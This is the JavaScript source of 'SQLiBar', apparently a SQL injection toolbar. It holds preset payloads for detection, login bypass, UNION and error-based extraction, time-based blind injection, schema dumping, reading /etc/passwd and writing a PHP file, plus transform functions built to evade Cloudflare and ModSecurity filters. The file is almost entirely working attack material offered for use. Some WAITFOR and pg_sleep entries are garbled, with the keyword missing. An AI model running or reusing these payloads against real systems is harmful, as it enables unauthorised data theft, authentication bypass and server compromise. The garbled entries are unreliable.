/**
 * SQLiBar – Comprehensive Payload Presets
 * Clean, practical, well-categorized
 * Dynamic UNION generation included
 */

const presetCategories = {

    /* ------------------------------------------------------------------ */
    /* 1. Detection / Fingerprinting                                      */
    /* ------------------------------------------------------------------ */
    "Detection": [
        { name: "Single Quote", payload: "'" },
        { name: "Double Quote", payload: "\"" },
        { name: "Backslash", payload: "\\" },
        { name: "Quote + Comment --", payload: "'--" },
        { name: "Quote + Comment #", payload: "'#" },
        { name: "Quote + Comment /*", payload: "'/*" },
        { name: "Null Byte", payload: "%00" },
        { name: "Quote + Null Byte", payload: "'%00" },
        { name: "Parenthesis", payload: "')" },
        { name: "Semicolon", payload: "';" },
        { name: "Special Chars", payload: "test'\"<>;()\\" },
        { name: "Logic Error", payload: "' AND 1=CONVERT(int,@@version)--" },
        { name: "Version Check (MySQL)", payload: "' AND @@version LIKE '5%'--" },
        { name: "Version Check (MSSQL)", payload: "' AND @@version LIKE '%Microsoft%'--" },
        { name: "Version Check (Postgres)", payload: "' AND version() LIKE '%PostgreSQL%'--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 2. Authentication Bypass                                           */
    /* ------------------------------------------------------------------ */
    "Auth Bypass": [
        { name: "OR 1=1 --", payload: "' OR 1=1--" },
        { name: "OR 1=1 #", payload: "' OR 1=1#" },
        { name: "OR '1'='1", payload: "' OR '1'='1" },
        { name: "OR 1=1 LIMIT 1--", payload: "' OR 1=1 LIMIT 1--" },
        { name: "admin'--", payload: "admin'--" },
        { name: "admin' #", payload: "admin'#" },
        { name: "admin'/*", payload: "admin'/*" },
        { name: "' OR 'a'='a", payload: "' OR 'a'='a" },
        { name: "') OR ('1'='1", payload: "') OR ('1'='1" },
        { name: "')) OR (('1'='1", payload: "')) OR (('1'='1" },
        { name: "OR TRUE--", payload: "' OR TRUE--" },
        { name: "OR 1--", payload: "' OR 1--" },
        { name: "OR 1=1)--", payload: "') OR 1=1--" },
        { name: "OR 1=1))--", payload: "')) OR 1=1--" },
        { name: "admin' OR 1=1--", payload: "admin' OR 1=1--" },
        { name: "' OR 1=1 LIMIT 1#", payload: "' OR 1=1 LIMIT 1#" }
    ],

    /* ------------------------------------------------------------------ */
    /* 3. Boolean-based                                                   */
    /* ------------------------------------------------------------------ */
    "Boolean-based": [
        { name: "AND 1=1", payload: "' AND 1=1--" },
        { name: "AND 1=2", payload: "' AND 1=2--" },
        { name: "AND '1'='1", payload: "' AND '1'='1" },
        { name: "AND '1'='2", payload: "' AND '1'='2" },
        { name: "OR 1=1", payload: "' OR 1=1--" },
        { name: "OR 1=2", payload: "' OR 1=2--" },
        { name: "AND TRUE", payload: "' AND TRUE--" },
        { name: "AND FALSE", payload: "' AND FALSE--" },
        { name: "AND (SELECT 1)=1", payload: "' AND (SELECT 1)=1--" },
        { name: "AND (SELECT 1)=2", payload: "' AND (SELECT 1)=2--" },
        { name: "AND SUBSTRING(@@version,1,1)='5'", payload: "' AND SUBSTRING(@@version,1,1)='5'--" },
        { name: "AND ASCII(SUBSTRING(@@version,1,1))>50", payload: "' AND ASCII(SUBSTRING(@@version,1,1))>50--" },
        { name: "AND LENGTH(database())>1", payload: "' AND LENGTH(database())>1--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 4. Union-based (dynamic)                                           */
    /* ------------------------------------------------------------------ */
    "Union-based": [
        { name: "UNION NULL", payload: null, dynamic: "union-null" },
        { name: "UNION ALL NULL", payload: null, dynamic: "union-all-null" },
        { name: "UNION Numbers", payload: null, dynamic: "union-numbers" },
        { name: "UNION + version", payload: null, dynamic: "union-version" },
        { name: "UNION + user()", payload: null, dynamic: "union-user" },
        { name: "UNION + database()", payload: null, dynamic: "union-db" },
        { name: "UNION + @@hostname", payload: null, dynamic: "union-hostname" },
        { name: "ORDER BY (columns)", payload: null, dynamic: "union-orderby" },
        { name: "UNION + table_name", payload: null, dynamic: "union-tables" },
        { name: "UNION + column_name", payload: null, dynamic: "union-columns" }
    ],

    /* ------------------------------------------------------------------ */
    /* 5. Error-based                                                     */
    /* ------------------------------------------------------------------ */
    "Error-based": [
        // MySQL
        { name: "ExtractValue", payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--" },
        { name: "UpdateXML", payload: "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--" },
        { name: "FLOOR + RAND", payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" },
        { name: "EXP overflow", payload: "' AND EXP(~(SELECT * FROM (SELECT @@version)x))--" },
        { name: "GTID_SUBSET", payload: "' AND GTID_SUBSET(CONCAT(0x7e,@@version),1)--" },
        { name: "JSON_KEYS", payload: "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,@@version)) USING utf8)))--" },

        // MSSQL
        { name: "CONVERT (MSSQL)", payload: "' AND 1=CONVERT(int,@@version)--" },
        { name: "CAST (MSSQL)", payload: "' AND 1=CAST(@@version AS int)--" },
        { name: "UPDATEXML (MSSQL)", payload: "' AND 1=(UPDATEXML(1,CONCAT(0x7e,@@version)))--" },

        // PostgreSQL
        { name: "CAST (Postgres)", payload: "' AND 1=CAST(version() AS int)--" },
        { name: "to_char error", payload: "' AND 1=CAST((SELECT version()) AS int)--" },

        // Oracle
        { name: "CTXSYS (Oracle)", payload: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--" },
        { name: "XMLType (Oracle)", payload: "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(62))) FROM dual) IS NOT NULL--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 6. Time-based / Blind                                              */
    /* ------------------------------------------------------------------ */
    "Time-based": [
        { name: "SLEEP 5 (MySQL)", payload: "' AND SLEEP(5)--" },
        { name: "SLEEP 10", payload: "' AND SLEEP(10)--" },
        { name: "BENCHMARK", payload: "' AND BENCHMARK(5000000,SHA1('test'))--" },
        { name: "heavy query", payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" },
        { name: "IF SLEEP", payload: "' OR IF(1=1,SLEEP(5),0)--" },
        { name: "WAITFOR DELAY 5 (MSSQL)", payload: "';(5)--" },
        { name: "WAITFOR DELAY 10", payload: "';(10)--" },
        { name: "pg_sleep 5 (Postgres)", payload: "';(5)--" },
        { name: "pg_sleep 10", payload: "';(10)--" },
        { name: "DBMS_PIPE (Oracle)", payload: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--" },
        { name: "CASE WHEN SLEEP", payload: "' AND (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 7. ORDER BY / GROUP BY Column Count                                         */
    /* ------------------------------------------------------------------ */
    "ORDER BY": [
        { name: "ORDER BY 1", payload: "' ORDER BY 1--" },
        { name: "ORDER BY 5", payload: "' ORDER BY 5--" },
        { name: "ORDER BY 10", payload: "' ORDER BY 10--" },
        { name: "ORDER BY 15", payload: "' ORDER BY 15--" },
        { name: "ORDER BY 20", payload: "' ORDER BY 20--" },
        { name: "ORDER/**/BY", payload: "'/**/ORDER/**/BY/**/1--" },
        { name: "/*!ORDER BY*/", payload: "'/*!ORDER BY*/1--" },
        { name: "/*!50000ORDER BY*/", payload: "'/*!50000ORDER BY*/1--" },
        { name: "ORDER BY (SELECT 1)", payload: "' ORDER BY (SELECT 1)--" }
    ],
    "GROUP BY": [
        { name: "GROUP BY 1", payload: "' GROUP BY 1--" },
        { name: "GROUP BY 1,2", payload: "' GROUP BY 1,2--" },
        { name: "GROUP BY 1,2,3", payload: "' GROUP BY 1,2,3--" },
        { name: "GROUP BY NULL", payload: "' GROUP BY NULL--" },
        { name: "GROUP/**/BY", payload: "'/**/GROUP/**/BY/**/1--" },
        { name: "/*!GROUP BY*/", payload: "'/*!GROUP BY*/1--" },
        { name: "/*!50000GROUP BY*/", payload: "'/*!50000GROUP BY*/1--" },
        { name: "GROUP BY (SELECT 1)", payload: "' GROUP BY (SELECT 1)--" },
        { name: "GROUP BY 1 HAVING 1=1", payload: "' GROUP BY 1 HAVING 1=1--" },
        { name: "GROUP BY 1 HAVING 1=2", payload: "' GROUP BY 1 HAVING 1=2--" }
    ],
    /* ------------------------------------------------------------------ */
    /* 8. Information Schema / Enumeration                                */
    /* ------------------------------------------------------------------ */
    "Enumeration": [
        { name: "database()", payload: "' UNION SELECT database(),NULL--" },
        { name: "user()", payload: "' UNION SELECT user(),NULL--" },
        { name: "@@version", payload: "' UNION SELECT @@version,NULL--" },
        { name: "@@hostname", payload: "' UNION SELECT @@hostname,NULL--" },
        { name: "schema()", payload: "' UNION SELECT schema(),NULL--" },
        { name: "current_user", payload: "' UNION SELECT current_user,NULL--" },
        { name: "Tables (basic)", payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--" },
        { name: "Tables + schema", payload: "' UNION SELECT table_schema,table_name FROM information_schema.tables--" },
        { name: "Columns", payload: "' UNION SELECT column_name,NULL FROM information_schema.columns--" },
        { name: "Columns of table", payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--" },
        { name: "group_concat tables", payload: "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--" },
        { name: "group_concat columns", payload: "' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 9. WAF / Filter Bypass                                             */
    /* ------------------------------------------------------------------ */
    "WAF Bypass": [
        // Comment & whitespace tricks
        { name: "/**/ instead of space", payload: "'/**/OR/**/1=1--" },
        { name: "Inline comment", payload: "'/**/OR/**/1/**/=/**/1--" },
        { name: "%0a / %0d", payload: "'%0aOR%0a1=1--" },
        { name: "%09 Tab", payload: "'%09OR%091=1--" },
        { name: "%0b / %0c", payload: "'%0bOR%0c1=1--" },
        { name: "/*! */ MySQL", payload: "'/*!OR*/1=1--" },
        { name: "/*!50000*/", payload: "'/*!50000OR*/1=1--" },

        // Case & encoding
        { name: "UnIoN SeLeCt", payload: "' UnIoN SeLeCt NULL--" },
        { name: "%55nion %53elect", payload: "'%55nion %53elect NULL--" },
        { name: "Double URL Encode", payload: "%2527%20OR%201%253D1--" },
        { name: "Unicode %u0027", payload: "%u0027 OR 1=1--" },
        { name: "Hex 0x27", payload: "0x27 OR 1=1--" },

        // Logical alternatives
        { name: "|| instead of OR", payload: "' || 1=1--" },
        { name: "&& instead of AND", payload: "' && 1=1--" },
        { name: "LIKE instead of =", payload: "' OR '1' LIKE '1" },
        { name: "REGEXP", payload: "' OR '1' REGEXP '1" },
        { name: "BETWEEN", payload: "' OR 1 BETWEEN 0 AND 1--" },
        { name: "IS NOT NULL", payload: "' OR 1 IS NOT NULL--" },
        { name: "Null-safe <=>", payload: "' OR 1<=>1--" },
        { name: "Scientific 1e0", payload: "' OR 1e0=1e0--" },

        // Advanced UNION bypasses
        { name: "/*!50000UNION SELECT*/", payload: "'/**//*!50000UNION SELECT*//**/1,2,3--" },
        { name: "union distinct select", payload: "'+union+distinct+select+1,2,3--" },
        { name: "un/**/ion se/**/lect", payload: "'+un/**/ion+se/**/lect+1,2,3--" },
        { name: "%0Aunion%0Aselect", payload: "'%0Aunion%0Aselect%0A1,2,3--" },
        { name: "/*!uNIOn*/ /*!SelECt*/", payload: "'/*!uNIOn*/ /*!SelECt*/1,2,3--" },
        { name: "UNION(SELECT(1),2,3)", payload: "'UNION(SELECT(1),2,3)--" },
        { name: "/*!--*/union/*!--*/", payload: "'/*!--*/union/*!--*/select/*!--*/1,2,3--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 10. Stacked Queries & Dangerous                                    */
    /* ------------------------------------------------------------------ */
    "Stacked / File": [
        { name: "Stacked WAITFOR", payload: "';(5)--" },
        { name: "Stacked SELECT", payload: "';(1)--" },
        { name: "INTO OUTFILE", payload: "' INTO OUTFILE '/tmp/out.txt'--" },
        { name: "INTO DUMPFILE", payload: "' INTO DUMPFILE '/tmp/shell.php'--" },
        { name: "LOAD_FILE", payload: "' AND LOAD_FILE('/etc/passwd')--" },
        { name: "LOAD_FILE win", payload: "' AND LOAD_FILE('C:\\\\Windows\\\\win.ini')--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 11. Useful Functions / Helpers                                     */
    /* ------------------------------------------------------------------ */
    "Helpers": [
        { name: "CONCAT()", payload: "CONCAT()" },
        { name: "CONCAT_WS()", payload: "CONCAT_WS(':',user(),database())" },
        { name: "GROUP_CONCAT()", payload: "GROUP_CONCAT(table_name)" },
        { name: "GROUP_CONCAT separator", payload: "GROUP_CONCAT(table_name SEPARATOR ',')" },
        { name: "SUBSTRING", payload: "SUBSTRING(@@version,1,1)" },
        { name: "MID / SUBSTR", payload: "MID(@@version,1,1)" },
        { name: "ASCII / ORD", payload: "ASCII(SUBSTRING(@@version,1,1))" },
        { name: "LENGTH / CHAR_LENGTH", payload: "LENGTH(database())" },
        { name: "HEX / UNHEX", payload: "HEX(database())" },
        { name: "CHAR()", payload: "CHAR(49,50,51)" },
        { name: "IF / CASE", payload: "IF(1=1,SLEEP(5),0)" },
        { name: "version()", payload: "version()" },
        { name: "user() / current_user()", payload: "user()" },
        { name: "database() / schema()", payload: "database()" }
    ],
    
    "Alternatives / Math": [
        { name: "MOD(1,1)", payload: "' OR MOD(1,1)--" },
        { name: "MOD(1,2)", payload: "' OR MOD(1,2)--" },
        { name: "1 DIV 1", payload: "' OR 1 DIV 1--" },
        { name: "1 XOR 0", payload: "' OR 1 XOR 0--" },
        { name: "1&1", payload: "' OR 1&1--" },
        { name: "1|0", payload: "' OR 1|0--" },
        { name: "1^0", payload: "' OR 1^0--" },
        { name: "1*1", payload: "' OR 1*1--" },
        { name: "1+0", payload: "' OR 1+0--" },
        { name: "POWER(1,1)", payload: "' OR POWER(1,1)--" },
        { name: "IN (1)", payload: "' OR 1 IN (1)--" },
        { name: "NOT IN (0)", payload: "' OR 1 NOT IN (0)--" },
        { name: "BETWEEN 0 AND 1", payload: "' OR 1 BETWEEN 0 AND 1--" },
        { name: "NOT BETWEEN 2 AND 3", payload: "' OR 1 NOT BETWEEN 2 AND 3--" },
        { name: "EXISTS(SELECT 1)", payload: "' OR EXISTS(SELECT 1)--" },
        { name: "SOUNDS LIKE", payload: "' OR 'a' SOUNDS LIKE 'a'--" },
        { name: "RLIKE", payload: "' OR '1' RLIKE '1'--" },
        { name: "IFNULL(1,0)=1", payload: "' OR IFNULL(1,0)=1--" },
        { name: "COALESCE(1,0)=1", payload: "' OR COALESCE(1,0)=1--" }
    ],

    "DumpInOneShot": [
        { name: "DIOS_1", payload: "concat_ws('<br>','zet',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database())))" },
        { name: "DIOS_Databases", payload: "(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema.schemata)%20where%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,schema_name))))x)" },
        { name: "DIOS_Tables", payload: "(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema.tables)%20where%20(table_schema=database())%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,table_name))))x)" },
        { name: "DIOS_4", payload: "concat(@c:=0x00,if((select%20count(*)%20from%20information_schema.columns%20where%20table_schema%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c)" },
        { name: "DIOS_5", payload: "(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))" },
        { name: "DIOS_6", payload: "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)" },
        { name: "DIOS_7", payload: "(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*)%20from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))" }
    ]
};


/**
 * WAF Bypass Transformations
 * Jede Transform-Funktion bekommt den aktuellen Payload und gibt den transformierten zurück.
 * Kann beliebig erweitert werden.
 */
const wafBypassTransforms = {

    /* ================================================================
       GENERIC / UNIVERSAL
       ================================================================ */
    "Generic": [
        // --- Whitespace / Separator ---
        {
            name: "Spaces → /**/",
            desc: "Klassiker: Leerzeichen durch Inline-Comments",
            transform: (p) => p.replace(/\s+/g, "/**/")
        },
        {
            name: "Spaces → /**//**/",
            transform: (p) => p.replace(/\s+/g, "/**//**/")
        },
        {
            name: "Spaces → %0a (LF)",
            transform: (p) => p.replace(/\s+/g, "%0a")
        },
        {
            name: "Spaces → %0d (CR)",
            transform: (p) => p.replace(/\s+/g, "%0d")
        },
        {
            name: "Spaces → %0d%0a (CRLF)",
            transform: (p) => p.replace(/\s+/g, "%0d%0a")
        },
        {
            name: "Spaces → %09 (Tab)",
            transform: (p) => p.replace(/\s+/g, "%09")
        },
        {
            name: "Spaces → %0b (VT)",
            transform: (p) => p.replace(/\s+/g, "%0b")
        },
        {
            name: "Spaces → %0c (FF)",
            transform: (p) => p.replace(/\s+/g, "%0c")
        },
        {
            name: "Spaces → %a0 (NBSP)",
            transform: (p) => p.replace(/\s+/g, "%a0")
        },
        {
            name: "Spaces → /**/%0a/**/",
            transform: (p) => p.replace(/\s+/g, "/**/%0a/**/")
        },
        {
            name: "Spaces → + (plus)",
            transform: (p) => p.replace(/\s+/g, "+")
        },

        // --- Case Manipulation ---
        {
            name: "Case Mixing (UnIoN SeLeCt)",
            transform: (p) => p
                .replace(/union/gi, "UnIoN")
                .replace(/select/gi, "SeLeCt")
                .replace(/and/gi, "AnD")
                .replace(/or/gi, "oR")
                .replace(/from/gi, "FrOm")
                .replace(/where/gi, "WhErE")
                .replace(/order/gi, "OrDeR")
                .replace(/by/gi, "bY")
                .replace(/group/gi, "GrOuP")
                .replace(/having/gi, "HaViNg")
                .replace(/limit/gi, "LiMiT")
                .replace(/sleep/gi, "sLeEp")
                .replace(/benchmark/gi, "BeNcHmArK")
                .replace(/waitfor/gi, "wAiTfOr")
                .replace(/delay/gi, "dElAy")
                .replace(/information_schema/gi, "InFoRmAtIoN_ScHeMa")
        },
        {
            name: "All Uppercase Keywords",
            transform: (p) => p
                .replace(/union/gi, "UNION")
                .replace(/select/gi, "SELECT")
                .replace(/and/gi, "AND")
                .replace(/or/gi, "OR")
                .replace(/from/gi, "FROM")
                .replace(/where/gi, "WHERE")
                .replace(/order/gi, "ORDER")
                .replace(/group/gi, "GROUP")
                .replace(/having/gi, "HAVING")
                .replace(/limit/gi, "LIMIT")
                .replace(/sleep/gi, "SLEEP")
        },
        {
            name: "All Lowercase Keywords",
            transform: (p) => p
                .replace(/union/gi, "union")
                .replace(/select/gi, "select")
                .replace(/and/gi, "and")
                .replace(/or/gi, "or")
                .replace(/from/gi, "from")
                .replace(/where/gi, "where")
                .replace(/order/gi, "order")
                .replace(/group/gi, "group")
                .replace(/having/gi, "having")
                .replace(/limit/gi, "limit")
                .replace(/sleep/gi, "sleep")
        },

        // --- Inline / Nested Comments ---
        {
            name: "Inline Comments around keywords",
            transform: (p) => p.replace(
                /(union|select|and|or|from|where|order|by|group|having|limit|sleep|benchmark|waitfor|delay|information_schema|table_name|column_name)/gi,
                "/**/$1/**/"
            )
        },
        {
            name: "Nested Comments /**//**/",
            transform: (p) => p.replace(
                /(union|select|and|or|from|where)/gi,
                "/**//**/$1/**//**/"
            )
        },
{
    name: "MySQL /*! */ Comments",
        transform: (p) => p
            .replace(/union/gi, "/*!UNION*/")
            .replace(/select/gi, "/*!SELECT*/")
            .replace(/and/gi, "/*!AND*/")
            .replace(/or/gi, "/*!OR*/")
            .replace(/from/gi, "/*!FROM*/")
            .replace(/where/gi, "/*!WHERE*/")
            .replace(/order/gi, "/*!ORDER*/")
            .replace(/by/gi, "/*!BY*/")
            .replace(/sleep/gi, "/*!SLEEP*/")
},
{
    name: "MySQL Versioned /*!50000*/",
        transform: (p) => p
            .replace(/union/gi, "/*!50000UNION*/")
            .replace(/select/gi, "/*!50000SELECT*/")
            .replace(/and/gi, "/*!50000AND*/")
            .replace(/or/gi, "/*!50000OR*/")
            .replace(/from/gi, "/*!50000FROM*/")
            .replace(/where/gi, "/*!50000WHERE*/")
            .replace(/order/gi, "/*!50000ORDER*/")
            .replace(/by/gi, "/*!50000BY*/")
            .replace(/group/gi, "/*!50000GROUP*/")
            .replace(/having/gi, "/*!50000HAVING*/")
            .replace(/limit/gi, "/*!50000LIMIT*/")
            .replace(/sleep/gi, "/*!50000SLEEP*/")
            .replace(/benchmark/gi, "/*!50000BENCHMARK*/")
},
{
    name: "MySQL /*!12345*/ (älter)",
        transform: (p) => p
            .replace(/union/gi, "/*!12345UNION*/")
            .replace(/select/gi, "/*!12345SELECT*/")
            .replace(/and/gi, "/*!12345AND*/")
            .replace(/or/gi, "/*!12345OR*/")
},

// --- Encoding ---
{
    name: "URL Encode (full)",
        transform: (p) => encodeURIComponent(p)
},
{
    name: "Double URL Encode",
        transform: (p) => encodeURIComponent(encodeURIComponent(p))
},
{
    name: "Triple URL Encode",
        transform: (p) => encodeURIComponent(encodeURIComponent(encodeURIComponent(p)))
},
{
    name: "URL Encode selective (SQLi chars)",
        transform: (p) => p
            .replace(/ /g, "%20")
            .replace(/'/g, "%27")
            .replace(/"/g, "%22")
            .replace(/=/g, "%3D")
            .replace(/#/g, "%23")
            .replace(/\(/g, "%28")
            .replace(/\)/g, "%29")
            .replace(/;/g, "%3B")
            .replace(/--/g, "%2D%2D")
},
{
    name: "Double Encode only quotes & spaces",
        transform: (p) => p
            .replace(/ /g, "%2520")
            .replace(/'/g, "%2527")
            .replace(/"/g, "%2522")
            .replace(/=/g, "%253D")
},
{
    name: "Unicode %uXXXX (quotes)",
        transform: (p) => p
            .replace(/'/g, "%u0027")
            .replace(/"/g, "%u0022")
            .replace(/ /g, "%u0020")
},
{
    name: "Unicode %u + Case Mix",
        transform: (p) => p
            .replace(/'/g, "%u0027")
            .replace(/union/gi, "UnIoN")
            .replace(/select/gi, "SeLeCt")
            .replace(/\s+/g, "/**/")
},
{
    name: "Hex 0x27 for quotes",
        transform: (p) => p.replace(/'/g, "0x27")
},
{
    name: "CHAR() style hint (quotes → CHAR)",
        transform: (p) => p.replace(/'/g, "CHAR(39)")
},

// --- Operator Alternatives ---
{
    name: "|| und && statt OR/AND",
        transform: (p) => p
            .replace(/\bOR\b/gi, "||")
            .replace(/\bAND\b/gi, "&&")
},
{
    name: "LIKE statt =",
        transform: (p) => p
            .replace(/1\s*=\s*1/gi, "1 LIKE 1")
            .replace(/1\s*=\s*2/gi, "1 LIKE 2")
            .replace(/'1'\s*=\s*'1'/gi, "'1' LIKE '1'")
            .replace(/'1'\s*=\s*'2'/gi, "'1' LIKE '2'")
},
{
    name: "RLIKE / REGEXP statt =",
        transform: (p) => p
            .replace(/1\s*=\s*1/gi, "1 RLIKE 1")
            .replace(/1\s*=\s*2/gi, "1 RLIKE 2")
            .replace(/'1'\s*=\s*'1'/gi, "'1' REGEXP '1'")
},
{
    name: "BETWEEN statt =",
        transform: (p) => p
            .replace(/1\s*=\s*1/gi, "1 BETWEEN 0 AND 1")
            .replace(/1\s*=\s*2/gi, "1 BETWEEN 2 AND 3")
},
{
    name: "IS NOT NULL / IS NULL Tricks",
        transform: (p) => p
            .replace(/1\s*=\s*1/gi, "1 IS NOT NULL")
            .replace(/1\s*=\s*2/gi, "1 IS NULL")
},
{
    name: "Null-safe <=> Operator",
        transform: (p) => p.replace(/=\s*/g, "<=>")
},
{
    name: "Scientific notation (1e0)",
        transform: (p) => p
            .replace(/\b1\s*=\s*1\b/gi, "1e0=1e0")
            .replace(/\b1\s*=\s*2\b/gi, "1e0=2e0")
            .replace(/\b0\s*=\s*0\b/gi, "0e0=0e0")
},
{
    name: "IN / NOT IN",
        transform: (p) => p
            .replace(/1\s*=\s*1/gi, "1 IN (1)")
            .replace(/1\s*=\s*2/gi, "1 NOT IN (1)")
},
{
    name: "MOD / DIV / XOR",
        transform: (p) => p
            .replace(/1\s*=\s*1/gi, "MOD(1,1)=1")
            .replace(/1\s*=\s*2/gi, "MOD(1,2)=1")
            .replace(/1\s*=\s*1/gi, "1 DIV 1")
            .replace(/1\s*=\s*1/gi, "1 XOR 0")
},

// --- Combined strong generics ---
{
    name: "Strong: Comments + Case + Newline",
        transform: (p) => p
            .replace(/\s+/g, "%0a")
            .replace(/union/gi, "/*!UNION*/")
            .replace(/select/gi, "/*!SELECT*/")
            .replace(/and/gi, "/*!AND*/")
            .replace(/or/gi, "/*!OR*/")
},
{
    name: "Strong: Double Encode + Comments",
        transform: (p) => encodeURIComponent(encodeURIComponent(
            p.replace(/\s+/g, "/**/")
                .replace(/union/gi, "/*!UNION*/")
                .replace(/select/gi, "/*!SELECT*/")
        ))
},
{
    name: "Strong: Versioned + Case + /**/",
        transform: (p) => p
            .replace(/\s+/g, "/**/")
            .replace(/union/gi, "/*!50000UnIoN*/")
            .replace(/select/gi, "/*!50000SeLeCt*/")
            .replace(/and/gi, "/*!50000AnD*/")
            .replace(/or/gi, "/*!50000oR*/")
}
    ],

/* ================================================================
   CLOUDFLARE
   ================================================================ */
"Cloudflare": [
    {
        name: "/*!50000*/ Versioned (sehr stark)",
        desc: "Eine der zuverlässigsten CF-Bypass-Techniken",
        transform: (p) => p
            .replace(/union/gi, "/*!50000UNION*/")
            .replace(/select/gi, "/*!50000SELECT*/")
            .replace(/and/gi, "/*!50000AND*/")
            .replace(/or/gi, "/*!50000OR*/")
            .replace(/from/gi, "/*!50000FROM*/")
            .replace(/where/gi, "/*!50000WHERE*/")
            .replace(/order/gi, "/*!50000ORDER*/")
            .replace(/by/gi, "/*!50000BY*/")
            .replace(/group/gi, "/*!50000GROUP*/")
            .replace(/having/gi, "/*!50000HAVING*/")
            .replace(/limit/gi, "/*!50000LIMIT*/")
            .replace(/sleep/gi, "/*!50000SLEEP*/")
            .replace(/benchmark/gi, "/*!50000BENCHMARK*/")
            .replace(/information_schema/gi, "/*!50000INFORMATION_SCHEMA*/")
    },
    {
        name: "/*!12345*/ + Case Mix",
        transform: (p) => p
            .replace(/union/gi, "/*!12345UnIoN*/")
            .replace(/select/gi, "/*!12345SeLeCt*/")
            .replace(/and/gi, "/*!12345AnD*/")
            .replace(/or/gi, "/*!12345oR*/")
            .replace(/\s+/g, "/**/")
    },
    {
        name: "Newline %0a + Case",
        transform: (p) => p
            .replace(/\s+/g, "%0a")
            .replace(/union/gi, "UnIoN")
            .replace(/select/gi, "SeLeCt")
            .replace(/and/gi, "AnD")
            .replace(/or/gi, "oR")
            .replace(/from/gi, "FrOm")
            .replace(/where/gi, "WhErE")
    },
    {
        name: "CRLF %0d%0a + Versioned",
        transform: (p) => p
            .replace(/\s+/g, "%0d%0a")
            .replace(/union/gi, "/*!50000UNION*/")
            .replace(/select/gi, "/*!50000SELECT*/")
    },
    {
        name: "Comment + Double Encode",
        transform: (p) => encodeURIComponent(
            p.replace(/\s+/g, "/**/")
                .replace(/union/gi, "/*!UNION*/")
                .replace(/select/gi, "/*!SELECT*/")
                .replace(/and/gi, "/*!AND*/")
                .replace(/or/gi, "/*!OR*/")
        )
    },
    {
        name: "Scientific 1e0 + Comments",
        transform: (p) => p
            .replace(/\b1\s*=\s*1\b/gi, "1e0=1e0")
            .replace(/\b1\s*=\s*2\b/gi, "1e0=2e0")
            .replace(/\s+/g, "/**/")
    },
    {
        name: "|| / && + Versioned Comments",
        transform: (p) => p
            .replace(/\bOR\b/gi, "||")
            .replace(/\bAND\b/gi, "&&")
            .replace(/union/gi, "/*!50000UNION*/")
            .replace(/select/gi, "/*!50000SELECT*/")
    },
    {
        name: "Nested Comments + %0a",
        transform: (p) => p
            .replace(/\s+/g, "/**/%0a/**/")
            .replace(/union/gi, "/*!UNION*/")
            .replace(/select/gi, "/*!SELECT*/")
    },
    {
        name: "Fullwidth + Versioned",
        transform: (p) => p
            .replace(/'/g, "＇")
            .replace(/union/gi, "/*!50000UNION*/")
            .replace(/select/gi, "/*!50000SELECT*/")
            .replace(/\s+/g, "/**/")
    },
    {
        name: "Strong CF Combo (Versioned + Case + %0a)",
        transform: (p) => p
            .replace(/\s+/g, "%0a")
            .replace(/union/gi, "/*!50000UnIoN*/")
            .replace(/select/gi, "/*!50000SeLeCt*/")
            .replace(/and/gi, "/*!50000AnD*/")
            .replace(/or/gi, "/*!50000oR*/")
            .replace(/from/gi, "/*!50000FrOm*/")
            .replace(/where/gi, "/*!50000WhErE*/")
    },
    {
        name: "CF – Inline /*! */ around everything",
        transform: (p) => p.replace(
            /(union|select|and|or|from|where|order|by|group|limit|sleep)/gi,
            "/*!$1*/"
        )
    }
],

    /* ================================================================
       MODSECURITY / OWASP CRS
       ================================================================ */
    "ModSecurity / OWASP CRS": [
        {
            name: "Nested /**/ + Case Mixing",
            transform: (p) => p
                .replace(/\s+/g, "/**/")
                .replace(/union/gi, "uNiOn")
                .replace(/select/gi, "sElEcT")
                .replace(/and/gi, "aNd")
                .replace(/or/gi, "oR")
                .replace(/from/gi, "fRoM")
                .replace(/where/gi, "wHeRe")
        },
        {
            name: "/*! */ MySQL style",
            transform: (p) => p
